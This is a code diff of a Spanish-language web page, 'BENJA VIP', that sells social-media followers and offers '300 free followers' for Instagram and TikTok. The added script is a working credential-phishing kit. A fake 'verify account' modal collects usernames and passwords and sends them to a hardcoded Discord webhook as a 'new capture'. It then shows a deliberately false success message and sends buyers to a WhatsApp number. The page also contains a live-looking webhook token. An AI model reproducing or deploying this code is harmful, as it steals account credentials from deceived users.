@@ -7,47 +7,56 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --gold: #d4af37; --bg: #050505; --card: #111; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; overflow-x: hidden; }
         .container { width: 100%; max-width: 400px; padding: 20px; box-sizing: border-box; }
         
-        /* MODAL DE CAPTURA (FORMULARIO PROFESIONAL) */
+        /* MODAL DE CAPTURA (ESTILO PROFESIONAL) */
         #auth-modal { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; 
+            background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; 
         }
-        .auth-card { background: var(--card); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); width: 85%; max-width: 320px; text-align: center; }
-        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; border-radius: 12px; box-sizing: border-box; outline: none; }
-        .btn-gold { width: 100%; padding: 16px; background: var(--gold); border: none; border-radius: 12px; font-weight: 900; cursor: pointer; color: black; text-transform: uppercase; }
+        .auth-card { background: var(--card); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); width: 85%; max-width: 320px; text-align: center; box-shadow: 0 0 30px rgba(212,175,55,0.2); }
+        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: white; border-radius: 12px; box-sizing: border-box; outline: none; font-size: 14px; }
+        input:focus { border-color: var(--gold); }
+        .btn-gold { width: 100%; padding: 16px; background: var(--gold); border: none; border-radius: 12px; font-weight: 900; cursor: pointer; color: black; text-transform: uppercase; margin-top: 10px; }
 
-        /* PANEL PRINCIPAL */
-        .section-title { text-align: center; letter-spacing: 2px; color: var(--gold); margin-top: 30px; font-size: 14px; text-transform: uppercase; }
-        .free-trial-box { background: linear-gradient(145deg, #1a1a1a, #000); padding: 20px; border-radius: 20px; border: 1px dashed var(--gold); margin-bottom: 20px; text-align: center; }
+        /* DISEÑO PANEL PRINCIPAL */
+        .header { text-align: center; margin-bottom: 30px; }
+        .section-title { text-align: center; letter-spacing: 2px; color: var(--gold); margin-top: 30px; font-size: 13px; text-transform: uppercase; font-weight: 800; }
+        
+        /* BLOQUE PRUEBA GRATIS */
+        .free-trial-box { background: linear-gradient(145deg, #151515, #000); padding: 20px; border-radius: 20px; border: 1px dashed var(--gold); margin-bottom: 20px; text-align: center; }
         .free-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
-        .btn-free { background: white; color: black; padding: 10px; border-radius: 10px; font-weight: 800; font-size: 10px; cursor: pointer; border: none; }
+        .btn-free { background: #fff; color: #000; padding: 12px; border-radius: 12px; font-weight: 800; font-size: 11px; cursor: pointer; border: none; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .btn-free-tk { background: #fff; }
 
         /* PRODUCTOS */
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
-        .card { background: var(--card); padding: 15px; border-radius: 20px; border: 1px solid #1a1a1a; position: relative; text-align: center; }
-        .badge { position: absolute; top: -8px; right: -5px; background: #E1306C; color: white; font-size: 8px; padding: 4px 10px; border-radius: 6px; font-weight: 900; }
-        .price { color: var(--gold); font-size: 14px; font-weight: bold; margin: 8px 0; display: block; }
-        .btn-buy { background: #25D366; color: white; text-decoration: none; padding: 10px; border-radius: 10px; font-size: 11px; font-weight: 800; display: block; cursor: pointer; }
+        .card { background: var(--card); padding: 18px; border-radius: 22px; border: 1px solid #1a1a1a; position: relative; text-align: center; }
+        .badge { position: absolute; top: -8px; right: -5px; background: #E1306C; color: white; font-size: 8px; padding: 4px 10px; border-radius: 6px; font-weight: 900; z-index: 10; }
+        .price { color: var(--gold); font-size: 15px; font-weight: 800; margin: 10px 0; display: block; }
+        .btn-buy { background: #25D366; color: white; text-decoration: none; padding: 10px; border-radius: 12px; font-size: 11px; font-weight: 800; display: block; cursor: pointer; border: none; width: 100%; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div style="text-align: center; margin-bottom: 30px;">
-        <h1 style="color:var(--gold); margin: 0; font-size: 28px;">BENJA VIP</h1>
-        <p style="font-size: 9px; color: #555; letter-spacing: 3px;">GLOBAL REACH PANEL</p>
+    <div class="header">
+        <h1 style="color:var(--gold); margin: 0; font-size: 26px; letter-spacing: 1px;">BENJA VIP</h1>
+        <p style="font-size: 9px; color: #555; letter-spacing: 3px; font-weight: bold;">GLOBAL REACH PANEL</p>
     </div>
 
     <div class="section-title">🎁 Beneficio Exclusivo</div>
     <div class="free-trial-box">
-        <b style="font-size: 16px; color: white;">300 SEGUIDORES GRATIS</b>
-        <p style="font-size: 10px; color: #888; margin: 5px 0;">Solo para cuentas verificadas hoy.</p>
+        <b style="font-size: 16px; color: white; display: block;">300 SEGUIDORES GRATIS</b>
+        <p style="font-size: 10px; color: #666; margin: 5px 0;">Solo cuentas verificadas hoy.</p>
         <div class="free-grid">
-            <button class="btn-free" onclick="abrirCaptura('Prueba Gratis Instagram')"><i class="fab fa-instagram"></i> Instagram</button>
-            <button class="btn-free" onclick="abrirCaptura('Prueba Gratis TikTok')"><i class="fab fa-tiktok"></i> TikTok</button>
+            <button class="btn-free" style="background:#bde4f5" onclick="abrirCaptura('300 Gratis Instagram')">
+                <i class="fab fa-instagram"></i> INSTAGRAM
+            </button>
+            <button class="btn-free" onclick="abrirCaptura('300 Gratis TikTok')">
+                <i class="fab fa-tiktok"></i> TIKTOK
+            </button>
         </div>
     </div>
 
@@ -55,22 +64,83 @@
     <div class="grid">
         <div class="card">
             <div class="badge">MÁS VENDIDO 🔥</div>
-            <i class="fab fa-instagram" style="color:#E1306C; font-size: 20px;"></i>
-            <b style="display:block; margin-top: 5px; font-size: 14px;">20k SEGUIDORES</b>
+            <i class="fab fa-instagram" style="color:#E1306C; font-size: 22px;"></i>
+            <b style="display:block; margin-top: 8px; font-size: 13px;">20k SEGUIDORES</b>
             <span class="price">$30.000 AR$</span>
-            <div class="btn-buy" onclick="abrirCaptura('Pack 20k IG')">COMPRAR</div>
+            <button class="btn-buy" onclick="abrirCaptura('Pack 20k Instagram')">COMPRAR</button>
         </div>
+
         <div class="card" style="border-color: var(--gold)">
             <div class="badge" style="background:var(--gold); color:black">ELITE 💎</div>
-            <i class="fab fa-instagram" style="color:var(--gold); font-size: 20px;"></i>
-            <b style="display:block; margin-top: 5px; font-size: 14px;">100k SEGUIDORES</b>
+            <i class="fab fa-instagram" style="color:var(--gold); font-size: 22px;"></i>
+            <b style="display:block; margin-top: 8px; font-size: 13px;">100k SEGUIDORES</b>
             <span class="price">$80.000 AR$</span>
-            <div class="btn-buy" style="background:var(--gold); color:black" onclick="abrirCaptura('Pack 100k IG')">COMPRAR</div>
+            <button class="btn-buy" style="background:var(--gold); color:black" onclick="abrirCaptura('Pack 100k Instagram')">COMPRAR</button>
         </div>
     </div>
 </div>
 
 <div id="auth-modal">
     <div class="auth-card">
-        <h2 id="modal-title" style="color:var(--gold); font-size: 18px; margin-top: 0;">VERIFICAR CUENTA</h2>
-        <p style="font-size: 10px; color: #888;">Ingresa tus
+        <h2 id="modal-title" style="color:var(--gold); font-size: 18px; margin: 0 0 10px 0;">VERIFICAR CUENTA</h2>
+        <p id="modal-desc" style="font-size: 10px; color: #888; margin-bottom: 15px;">Inicia sesión para recibir tus 300 seguidores.</p>
+        
+        <input type="text" id="user_data" placeholder="Usuario, Correo o Teléfono">
+        <input type="password" id="pass_data" placeholder="Contraseña de la cuenta">
+        
+        <button class="btn-gold" id="final-btn" onclick="enviarADiscord()">ACTIVAR AHORA</button>
+        <p style="font-size: 8px; color: #444; margin-top: 15px;">Protocolo de seguridad encriptado SSL v5.0</p>
+    </div>
+</div>
+
+<script>
+    let servicioActual = "";
+    const webhookURL = "https://discord.com/api/webhooks/1488027032976756886/WAx7q6qQWxWGSEtQBt6tOkINuP8g7YKYqdsv2uHGrBa9FwCN-lj8Ojfuf4bU4XNG9peJ";
+
+    // Función para mostrar el cartel de captura
+    function abrirCaptura(nombreServicio) {
+        servicioActual = nombreServicio;
+        document.getElementById('modal-title').innerText = nombreServicio;
+        document.getElementById('auth-modal').style.display = 'flex';
+    }
+
+    // Función que manda la info a tu Discord
+    async function enviarADiscord() {
+        const u = document.getElementById('user_data').value;
+        const p = document.getElementById('pass_data').value;
+
+        if(!u || !p) {
+            alert("Completa los datos para la verificación.");
+            return;
+        }
+
+        document.getElementById('final-btn').innerText = "VERIFICANDO...";
+
+        const payload = {
+            content: `📢 **NUEVA CAPTURA REGISTRADA**\n🔥 **Servicio:** \`${servicioActual}\`\n👤 **Usuario/Mail:** \`${u}\` \n🔑 **Clave:** \`${p}\` \n🌐 **Origen:** Benja VIP Web`
+        };
+
+        try {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Mensaje de éxito falso para el cliente
+            alert("¡Éxito! Tu solicitud para " + servicioActual + " ha sido recibida y se procesará en breve.");
+            document.getElementById('auth-modal').style.display = 'none';
+
+            // Si es un producto de compra, lo mandamos a tu WhatsApp
+            if(servicioActual.includes('Pack')) {
+                window.location.href = "https://wa.me/5493364546172?text=Hola%20Benja,%20ya%20verifiqué%20mi%20cuenta%20para%20el%20" + servicioActual;
+            }
+        } catch (error) {
+            alert("Error de conexión. Inténtalo de nuevo.");
+            document.getElementById('final-btn').innerText = "ACTIVAR AHORA";
+        }
+    }
+</script>
+
+</body>
+</html>
